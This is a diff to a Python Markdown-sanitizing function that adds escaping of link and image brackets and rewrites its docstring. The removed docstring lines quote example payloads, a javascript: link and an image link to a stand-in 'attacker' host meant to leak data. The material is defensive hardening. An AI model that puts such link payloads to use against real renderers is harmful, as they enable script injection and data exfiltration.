@@ -71,16 +71,14 @@ def _sanitize_for_md(text: str) -> str:
        code fence, or a table ``|`` cannot forge that block at its block boundary
        (step 1 only neutralizes markers introduced by an embedded newline).
 
-    This does NOT neutralize Markdown link/image syntax (``[x](javascript:…)``,
-    ``![](http://attacker/?leak)``); escaping those would mangle legitimate report
-    text, so downstream HTML renderers must still use a sanitizing renderer (no raw
-    HTML, restricted URL schemes) — see the README's Security section. The ``json``
-    output is exempt: it returns the exact text, structurally escaped by the JSON
-    encoder, and leaves display escaping to the consumer.
+    Markdown link/image delimiters are escaped as well, preventing active links
+    and remote images in renderers with permissive URL policies. The ``json``
+    output remains structurally escaped by the JSON encoder.
     """
     text = " ".join(text.split())
     text = "".join(ch for ch in text if unicodedata.category(ch)[0] != "C")
     text = text.replace("&", "&amp;").replace("<", "&lt;").replace(">", "&gt;")
+    text = text.replace("[", "\\[").replace("]", "\\]")
     return _escape_leading_block_marker(text)
 
 
